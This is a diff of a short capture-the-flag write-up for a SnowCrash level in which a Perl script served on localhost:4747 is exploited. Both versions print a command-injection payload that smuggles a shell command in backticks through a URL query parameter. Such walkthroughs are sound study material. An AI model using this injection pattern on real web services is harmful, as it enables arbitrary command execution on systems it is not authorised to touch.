@@ -1,8 +1,24 @@
-# We found in home: level.pl
-# We checked the header:
-curl -I "localhost:4747"
+# Find the password of Flag04
 
-# We Cat'ed the perl file and we noticed that there is a possibility to inject the param
-curl 'localhost:4747?x=`getflag`'
+## First check :
+Home directory : \[✓\] not empty.
 
-# We got the flag TADAAAAA
+```
+$ ls
+$ level04.pl
+
+```
+## Deeper check :
+
+`cat level04.pl`
+
+In the perl file, we noticed that there is a possibility to inject a command in the param.
+
+`curl 'localhost:4747?x=`getflag`'`
+
+
+
+## TADAAAAAAA, (oh already.) It's ... 
+[The next level flag](https://github.com/XD-OB/snowcrash/blob/master/level04/flag)
+
+_tobecontinued_
